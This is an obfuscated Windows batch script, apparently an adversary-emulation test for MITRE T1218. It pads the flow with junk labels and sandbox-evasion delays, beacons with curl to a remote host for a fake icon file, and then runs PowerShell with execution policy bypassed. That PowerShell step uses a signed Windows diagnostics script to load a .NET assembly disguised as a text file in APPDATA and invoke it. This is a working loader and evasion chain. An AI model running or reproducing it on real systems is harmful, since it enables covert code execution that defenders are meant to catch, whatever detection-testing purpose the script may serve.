@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET vftgbh=%APPDATA%\9295\4048e67e
SET qazwsx=https://10.0.0.49
SET edcrfv=https://10.0.0.49/stage/2/icon.png?9295-10
SET tgbyhn=ITZEL-S2BO
SET ujmikol=10
SET yhnujm=msedges.txt
SET plmokn=9295
SET zxcdfg=%APPDATA%\!ujmikol!\macula-simulations.log
SET wscxde=0

echo [!DATE! !TIME!][DEBUG][!tgbyhn!]: script_start=initialized>> "!zxcdfg!" 2>nul
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!tgbyhn!]: initial_delay=completed>> "!zxcdfg!" 2>nul
GOTO zsecdx

:lkjhgf
REM Dead code block - never executed
SET fake=!qazwsx!
GOTO END

:zsecdx
SET wscxde=0
GOTO dispatch

:qwerty
ping -n 8 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!tgbyhn!]: heartbeat_delay=started>> "!zxcdfg!" 2>nul
IF 1==1 (GOTO heartbeat) ELSE (GOTO deadcode1)

:deadcode1
EXIT

:heartbeat
curl -k -s -o nul "!edcrfv!"
echo [!DATE! !TIME!][DEBUG][!tgbyhn!]: heartbeat=executed>> "!zxcdfg!" 2>nul
SET result=1
SET err=
echo [!DATE! !TIME!][DEBUG][!tgbyhn!]: T1218_logging=starting>> "!zxcdfg!" 2>nul
echo [!DATE! !TIME!][!tgbyhn!]: !ujmikol!-!plmokn!-T1218|Signed_Binary_Proxy_Execution=!result!:!err!>> "!zxcdfg!" 2>nul
SET wscxde=17
GOTO dispatch

:mnbvcx
CHOICE /C Y /N /D Y /T 12 >nul
echo [!DATE! !TIME!][DEBUG][!tgbyhn!]: execution_delay=completed>> "!zxcdfg!" 2>nul
SET wscxde=42
GOTO dispatch

:deadcode2
REM Unreachable label
SET junk=data
GOTO END

:dispatch
IF !wscxde!==0 GOTO qwerty
IF !wscxde!==17 GOTO mnbvcx
IF !wscxde!==42 GOTO execute
IF !wscxde!==99 GOTO END

:poiuyt
GOTO END

:execute
SET /A rdelay=!RANDOM! %% 20 + 10
timeout /t !rdelay! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!tgbyhn!]: random_delay=!rdelay!s>> "!zxcdfg!" 2>nul
%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\powershell.exe -ep bypass -command "set-location -path C:\Windows\diagnostics\system\Audio; import-module .\CL_LoadAssembly.ps1; LoadAssemblyFromPath '!vftgbh!\\!yhnujm!';[Program]::Dale()"
echo [!DATE! !TIME!][DEBUG][!tgbyhn!]: assembly_execution=completed>> "!zxcdfg!" 2>nul
SET wscxde=99
GOTO dispatch

:deadcode3
REM More dead code
EXIT

:END
echo [!DATE! !TIME!][DEBUG][!tgbyhn!]: script_end=terminated>> "!zxcdfg!" 2>nul